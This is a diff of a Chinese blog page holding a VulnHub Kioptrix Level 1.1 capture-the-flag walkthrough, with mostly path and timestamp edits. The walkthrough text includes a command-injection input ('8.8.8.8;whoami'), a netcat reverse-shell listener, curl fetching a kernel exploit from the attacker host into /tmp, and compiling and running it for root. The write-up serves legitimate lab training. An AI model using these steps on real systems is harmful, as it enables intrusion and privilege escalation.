@@ -10,13 +10,13 @@
 <meta name="description" content="Kioptrix Level 1.1(#2) 参考 Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io)  渗透思路信息收集 nmap扫描ip，得到IP为192.168.89.138 nmap扫描端口及端口服务  12345678910111213141516Start">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Kioptrix Level 1.1(#2)">
-<meta property="og:url" content="http://example.com/2024/02/27/Kioptrix%20Level%201.1(#2)/index.html">
+<meta property="og:url" content="http://example.com/2024/02/27/Kioptrix-Level-1-1-2/index.html">
 <meta property="og:site_name" content="Mad1sun个人博客">
 <meta property="og:description" content="Kioptrix Level 1.1(#2) 参考 Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io)  渗透思路信息收集 nmap扫描ip，得到IP为192.168.89.138 nmap扫描端口及端口服务  12345678910111213141516Start">
 <meta property="og:locale">
 <meta property="og:image" content="http://example.com/img/404.jpg">
-<meta property="article:published_time" content="2024-02-27T10:46:35.035Z">
-<meta property="article:modified_time" content="2024-02-27T10:47:31.122Z">
+<meta property="article:published_time" content="2024-02-27T11:22:50.000Z">
+<meta property="article:modified_time" content="2024-02-27T11:26:36.173Z">
 <meta property="article:author" content="Mad1sun">
 <meta property="article:tag" content="vulnhub">
 <meta name="twitter:card" content="summary">
@@ -68,7 +68,7 @@
 
 <!-- Variable -->
 <script>window.ASYNC_CONFIG = {"hostname":"example.com","author":"Mad1sun","root":"/","typed_text":["Mad1sun:)"],"theme_version":"2.1.10","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":"rainbow.svg","icon16":"rainbow.svg","icon32":"rainbow.svg","appleTouchIcon":"rainbow.svg","webmanifest":"/site.webmanifest","visibilitychange":true,"hidden":"failure.ico","showText":"(/≧▽≦/)咦！又好了！","hideText":"(●—●)喔哟，崩溃啦！"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","sticky":"置顶","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":false,"plugin":{"flickr_justified_gallery":"https://npm.elemecdn.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","user_tag":"fas fa-user-alt","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"default","height_limit":200},"toc":{"post_title":false},"live_time":{"start_time":"","prefix":"博客已萌萌哒运行 undefined 天"}};</script>
-<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-02-27 18:47:31"};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-02-27 19:26:36"};</script>
 
 <!-- Theme mode css -->
 <link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.1.10" id="trm-switch-style">
@@ -334,7 +334,7 @@
     <div class="col-sm-4">
         <div class="trm-card trm-label trm-label-light text-center">
             <i class="iconfont far fa-clock trm-icon"></i><br>
-            18:46
+            19:22
         </div>
     </div>
     <div class="col-sm-4">
@@ -359,11 +359,11 @@
 <ul>
 <li>用浏览器访问<code>http://192.168.89.138</code>，发现是一个登录界面</li>
 </ul>
-<p>![截屏2024-02-03 下午5.08.05](.&#x2F;assets&#x2F;截屏2024-02-03 下午5.08.05.png)</p>
+<p>![截屏2024-02-03 下午5.08.05](.&#x2F;Kioptrix-Level-1-1-2&#x2F;截屏2024-02-03 下午5.08.05.png)</p>
 <ul>
 <li>F12 查看源代码</li>
 </ul>
-<img src="./assets/截屏2024-02-03 下午5.09.55.png" alt="截屏2024-02-03 下午5.09.55" style="zoom:70%;"  loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'/>
+<img src="/Users/madison/Documents/渗透测试/oscp/assets/截屏2024-02-03 下午5.09.55.png" alt="截屏2024-02-03 下午5.09.55" style="zoom:70%;"  loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'/>
 
 <p>看到<code>Start of HTML when logged in as Administartor</code>，推测用户名为<code>Administrator</code>(其实好像无关，但一些CTFer的基因动了，有些敏感hhh)</p>
 <h4 id="我的体验"><a href="#我的体验" class="headerlink" title="我的体验"></a>我的体验</h4><p>信息收集还算成功，也找到了突破口是web服务，看到登录表，第一想法就是sql注入，但死在web渗透经验为0，且sql注入不熟悉，因此卡在了这里。需要从0开始训练一下sql注入。</p>
@@ -378,15 +378,15 @@
 <li><p>成功后看到以下页面：</p>
 </li>
 </ul>
-<p>![截屏2024-02-03 下午5.35.22](.&#x2F;assets&#x2F;截屏2024-02-03 下午5.35.22.png)</p>
+<p>![截屏2024-02-03 下午5.35.22](.&#x2F;Kioptrix-Level-1-1-2&#x2F;截屏2024-02-03 下午5.35.22.png)</p>
 <h4 id="寻找漏洞：RCE漏洞"><a href="#寻找漏洞：RCE漏洞" class="headerlink" title="寻找漏洞：RCE漏洞"></a>寻找漏洞：RCE漏洞</h4><ul>
 <li>根据提示：ping a machine on the network，随便填了一个ip<code>8.8.8.8</code>，发现会显示shell命令以及执行结果</li>
 </ul>
-<p>![截屏2024-02-03 下午5.48.17](.&#x2F;assets&#x2F;截屏2024-02-03 下午5.48.17.png)</p>
+<p>![截屏2024-02-03 下午5.48.17](&#x2F;Users&#x2F;madison&#x2F;Documents&#x2F;渗透测试&#x2F;oscp&#x2F;assets&#x2F;截屏2024-02-03 下午5.48.17.png)</p>
 <ul>
 <li>猜测存在RCE漏洞：Remote Code&#x2F;Command Execute（第一次知道这叫做RCE），输入<code>8.8.8.8;whoami</code></li>
 </ul>
-<p>![截屏2024-02-03 下午5.50.46](.&#x2F;assets&#x2F;截屏2024-02-03 下午5.50.46.png)</p>
+<p>![截屏2024-02-03 下午5.50.46](&#x2F;Users&#x2F;madison&#x2F;Documents&#x2F;渗透测试&#x2F;oscp&#x2F;assets&#x2F;截屏2024-02-03 下午5.50.46.png)</p>
 <p>看到了whoami的结果<code>apache</code>，<em>看来拿到shell之后还要提权了</em></p>
 <p><strong>证明确实存在RCE</strong></p>
 <h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><blockquote>
@@ -398,7 +398,7 @@
 <li><p>在kali攻击机中开启监听 <code>nc -nvlp 4444</code></p>
 </li>
 </ul>
-<p>![截屏2024-02-03 下午6.01.38](.&#x2F;assets&#x2F;截屏2024-02-03 下午6.01.38.png)</p>
+<p>![截屏2024-02-03 下午6.01.38](.&#x2F;Kioptrix-Level-1-1-2&#x2F;截屏2024-02-03 下午6.01.38.png)</p>
 <p>成功拿到shell，但只是个权限很低的apache用户，接下来就是提权了</p>
 <h6 id="0x02-msfvenom生成后门"><a href="#0x02-msfvenom生成后门" class="headerlink" title="0x02 msfvenom生成后门"></a>0x02 msfvenom生成后门</h6><blockquote>
 <p>参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1 (#2) 常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com)</a></p>
@@ -419,7 +419,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(cat /proc/version || uname -a ) 2&gt;/dev/null</span><br><span class="line">lsb_release -a 2&gt;/dev/null # old, not by default on many systems</span><br><span class="line">cat /etc/os-release 2&gt;/dev/null # universal on modern systems</span><br></pre></td></tr></table></figure>
 
 <p><em>2&gt;&#x2F;dev&#x2F;null 是把标准错误输出到“黑洞”，即删除错误信息，可以解决大量屏幕输出的问题</em></p>
-<p>![截屏2024-02-03 下午10.46.56](.&#x2F;assets&#x2F;截屏2024-02-03 下午10.46.56.png)</p>
+<p>![截屏2024-02-03 下午10.46.56](.&#x2F;Kioptrix-Level-1-1-2&#x2F;截屏2024-02-03 下午10.46.56-9032564.png)</p>
 <p><strong>发现Linux版本是CentOS 4.5</strong></p>
 <ul>
 <li>还有一种工具<code>LinEnum.sh</code>脚本可以枚举目标靶机版本信息、用户信息、权限信息、环境信息、第三方软件信息，进程信息等</li>
@@ -430,7 +430,7 @@
 <h4 id="寻找CentOS-4-5漏洞利用提权脚本"><a href="#寻找CentOS-4-5漏洞利用提权脚本" class="headerlink" title="寻找CentOS 4.5漏洞利用提权脚本"></a>寻找CentOS 4.5漏洞利用提权脚本</h4><ul>
 <li><code>searchsploit CentOS 4.5</code></li>
 </ul>
-<p>![截屏2024-02-03 下午10.54.18](.&#x2F;assets&#x2F;截屏2024-02-03 下午10.54.18.png)</p>
+<p>![截屏2024-02-03 下午10.54.18](.&#x2F;Kioptrix-Level-1-1-2&#x2F;截屏2024-02-03 下午10.54.18.png)</p>
 <ul>
 <li>存到本地 <code>searchsploit -m linux_x86/local/9542.c</code></li>
 </ul>
@@ -439,16 +439,16 @@
 <ul>
 <li>在攻击机 <code>9542.c</code>所在目录使用命令<code>python3 -m http.server 6789</code></li>
 </ul>
-<p>![截屏2024-02-03 下午11.09.57](.&#x2F;assets&#x2F;截屏2024-02-03 下午11.09.57.png)</p>
+<p>![截屏2024-02-03 下午11.09.57](.&#x2F;Kioptrix-Level-1-1-2&#x2F;截屏2024-02-03 下午11.09.57.png)</p>
 <ul>
 <li>靶机通过<code>curl http://192.168.89.137:6789/9542.c --output /tmp/9542.c</code> 拉取文件至本地</li>
 </ul>
-<p>![截屏2024-02-03 下午11.13.18](.&#x2F;assets&#x2F;截屏2024-02-03 下午11.13.18.png)</p>
+<p>![截屏2024-02-03 下午11.13.18](.&#x2F;Kioptrix-Level-1-1-2&#x2F;截屏2024-02-03 下午11.13.18.png)</p>
 <p>&#x3D;&#x3D;<em><strong>这里output设置的路径，对于当前用户来说，必须要有写的权限，通过在根目录下<code>ls -al</code>看到apache用户只在<code>/tmp</code>文件中拥有<code>wx</code>的权限，因此选择存在<code>/tmp</code>文件下</strong></em>&#x3D;&#x3D;</p>
 <ul>
 <li>同时在攻击机上也可以看到靶机的信息</li>
 </ul>
-<p>![截屏2024-02-03 下午11.16.41](.&#x2F;assets&#x2F;截屏2024-02-03 下午11.16.41.png)</p>
+<p>![截屏2024-02-03 下午11.16.41](.&#x2F;Kioptrix-Level-1-1-2&#x2F;截屏2024-02-03 下午11.16.41.png)</p>
 <h5 id="0x02-service-apache2-start"><a href="#0x02-service-apache2-start" class="headerlink" title="0x02 service apache2 start"></a>0x02 service apache2 start</h5><ul>
 <li><p>在攻击机上打开apache服务：<code>sudo service apache2 start</code></p>
 </li>
@@ -461,7 +461,7 @@
 </ul>
 <h4 id="编译运行脚本"><a href="#编译运行脚本" class="headerlink" title="编译运行脚本"></a>编译运行脚本</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc ./9542.c -o 9542 #编译</span><br><span class="line">./9542 #运行</span><br></pre></td></tr></table></figure>
 
-<p>![截屏2024-02-03 下午11.23.15](.&#x2F;assets&#x2F;截屏2024-02-03 下午11.23.15.png)</p>
+<p>![截屏2024-02-03 下午11.23.15](.&#x2F;Kioptrix-Level-1-1-2&#x2F;截屏2024-02-03 下午11.23.15.png)</p>
 <h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><blockquote>
 <p>优秀总结：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1 (#2) 常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com)</a></p>
 </blockquote>
@@ -505,37 +505,6 @@
             <span data-number="02"></span>
         </h5>
     </div>
-    
-        <div class="col-lg-6">
-    <div class="trm-blog-card trm-scroll-animation">
-        <a href="/2024/02/27/Kioptrix%20Level%201/" class="trm-cover-frame trm-anima-link">
-            
-            
-                <img alt="cover" class="no-fancybox" src="/img/block.jpg">
-            
-        </a>
-        
-        <div class="trm-card-descr">
-            <div class="trm-label trm-category trm-mb-20">
-                <a href=" /categories/%E7%B1%BBOSCP%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/">
-                    类OSCP靶机练习
-                </a>
-            </div>
-            <h5>
-                <a href="/2024/02/27/Kioptrix%20Level%201/" class="trm-anima-link">
-                    Kioptrix Level 1
-                </a>
-            </h5>
-            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
-            <ul class="trm-card-data trm-label">
-                <li>24/02/27</li>
-                <li>18:46</li>
-                
-                
-            </ul>
-        </div>
-    </div>
-</div>
     
     
         <div class="col-lg-6">
